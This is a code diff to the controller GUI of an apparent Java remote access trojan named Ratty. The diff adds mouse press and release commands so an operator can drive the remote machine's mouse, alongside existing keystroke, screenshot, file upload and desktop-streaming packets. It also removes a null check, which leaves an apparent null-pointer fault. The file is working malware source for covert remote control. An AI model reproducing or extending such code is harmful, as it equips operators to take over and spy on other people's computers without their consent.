@@ -22,6 +22,7 @@ import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
 import de.sogomn.rat.packet.KeyEventPacket;
+import de.sogomn.rat.packet.MouseEventPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.packet.UploadFilePacket;
@@ -139,6 +140,20 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final int key = displayPanel.getLastKeyHit();
 			
 			packet = new KeyEventPacket(key, KeyEventPacket.RELEASE);
+		} else if (command == DisplayPanel.MOUSE_PRESSED) {
+			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
+			final int x = displayPanel.getLastXPos();
+			final int y = displayPanel.getLastYPos();
+			final int button = displayPanel.getLastButtonHit();
+			
+			packet = new MouseEventPacket(x, y, button, MouseEventPacket.PRESS);
+		} else if (command == DisplayPanel.MOUSE_RELEASED) {
+			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
+			final int x = displayPanel.getLastXPos();
+			final int y = displayPanel.getLastYPos();
+			final int button = displayPanel.getLastButtonHit();
+			
+			packet = new MouseEventPacket(x, y, button, MouseEventPacket.RELEASE);
 		}
 		
 		return packet;
@@ -249,20 +264,16 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	@Override
 	public void userInput(final String command) {
 		final ServerClient serverClient = gui.getLastServerClientClicked();
+		final IPacket packet = getPacket(command, serverClient);
 		
-		if (serverClient != null) {
-			final IPacket packet = getPacket(command, serverClient);
-			
-			if (packet != null) {
-				serverClient.client.addPacket(packet);
-			}
+		if (packet != null) {
+			serverClient.client.addPacket(packet);
 		}
 		
 		if (command == RattyGui.DESKTOP) {
-			serverClient.setStreamingDesktop(true);
-			gui.updateTable();
-		} else if (command == RattyGui.DESKTOP_STOP) {
-			serverClient.setStreamingDesktop(false);
+			final boolean streaming = serverClient.isStreamingDesktop();
+			
+			serverClient.setStreamingDesktop(!streaming);
 			gui.updateTable();
 		} else if (command == RattyGui.FILES) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
